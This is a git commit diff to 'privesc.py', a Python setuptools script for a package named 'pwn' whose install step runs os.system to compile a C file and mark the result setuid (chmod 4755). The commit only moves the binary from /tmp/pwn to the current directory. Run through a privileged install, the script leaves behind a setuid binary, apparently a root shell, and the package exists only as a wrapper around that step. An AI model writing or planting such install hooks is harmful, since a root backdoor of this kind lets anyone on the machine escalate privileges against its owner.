309af712ed84dc4afae1ef515574e6669d99e59c
abu_ubaida <oassladday@gmail.com>
2025-09-07 18:43:20 +0100

    Update privesc.py

--- privesc.py
+++ privesc.py
@@ -2,12 +2,13 @@ from setuptools import setup
 import os
 
 # Compile the suid binary
-os.system("gcc /tmp/pwn/suid.c -o /tmp/pwn/suid_shell")
+os.system("gcc ./privesc.c -o ./privesc")
 # Set permissions
-os.system("chmod 4755 /tmp/pwn/suid_shell")
+os.system("chmod 4755 ./privesc")
 
 setup(
     name='pwn',
     version='0.1',
     py_modules=['dummy_module'],
 )
+
